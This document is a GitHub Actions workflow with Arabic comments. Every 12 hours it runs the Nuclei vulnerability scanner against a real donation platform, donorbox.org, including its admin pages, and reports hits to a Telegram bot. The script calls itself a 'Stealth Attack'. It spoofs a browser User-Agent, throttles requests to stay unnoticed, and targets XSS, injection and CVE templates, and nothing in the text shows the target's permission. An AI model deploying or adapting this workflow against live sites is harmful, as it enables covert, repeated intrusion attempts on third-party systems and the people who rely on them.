name: V27 - The Ghost Hunter (Final Syntax Fix)

on:
  schedule:
    - cron: '0 */12 * * *' # كل 12 ساعة
  workflow_dispatch:       # تشغيل يدوي

jobs:
  ghost-job:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    
    steps:
      # 1. التثبيت (رجعنا للأساسيات)
      - name: Install Arsenal
        run: |
          sudo apt-get update && sudo apt-get install -y coreutils jq wget unzip libpcap-dev
          
          # Nuclei
          wget -q https://github.com/projectdiscovery/nuclei/releases/download/v3.2.9/nuclei_3.2.9_linux_amd64.zip
          unzip -o -q nuclei_3.2.9_linux_amd64.zip
          sudo mv nuclei /usr/local/bin/
          
          rm *.zip
          nuclei -update-templates

      # 2. تحديد الأهداف
      - name: Set Targets
        run: |
          touch targets.txt
          echo "https://donorbox.org/potato" >> targets.txt
          echo "https://donorbox.org/org_admin" >> targets.txt
          echo "https://donorbox.org/embed/potato" >> targets.txt
          echo "https://donorbox.org" >> targets.txt
          echo "https://donorbox.org/admin" >> targets.txt

      # 3. الهجوم الشبحي (التصحيح النهائي للصيغة) 👻
      - name: Ghost Scan (Fixed Arguments)
        run: |
          echo "👻 Starting Stealth Attack..."
          
          # التصحيح:
          # 1. رجعنا لـ -headless-options (لأنه هو اللي شغال في النسخة دي)
          # 2. حطينا القيم جوه quotes ومعاها الشرط (--)
          
          nuclei -l targets.txt \
            -headless \
            -headless-options "--no-sandbox, --disable-gpu, --disable-dev-shm-usage" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
            -tags xss,dom,fuzz,injection,cve \
            -s critical,high,medium \
            -rl 5 -bs 1 -c 2 -timeout 15 \
            -je ghost_results.json

      # 4. التبليغ
      - name: Alert System
        env:
          TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -s ghost_results.json ]; then
            cat ghost_results.json | while read line; do
              NAME=$(echo $line | jq -r '.info.name')
              SEVERITY=$(echo $line | jq -r '.info.severity')
              URL=$(echo $line | jq -r '.matched-at')
              
              MSG="👻 **GHOST HIT (Donorbox)!**
              🐛 Bug: $NAME
              ⚠️ Severity: $SEVERITY
              🔗 URL: \`$URL\`"
              
              curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
              -d chat_id="$TG_CHAT" \
              -d text="$MSG" -d parse_mode="Markdown"
              sleep 2
            done
          else
             echo "✅ Ghost scan finished. No vulnerabilities found this time."
          fi
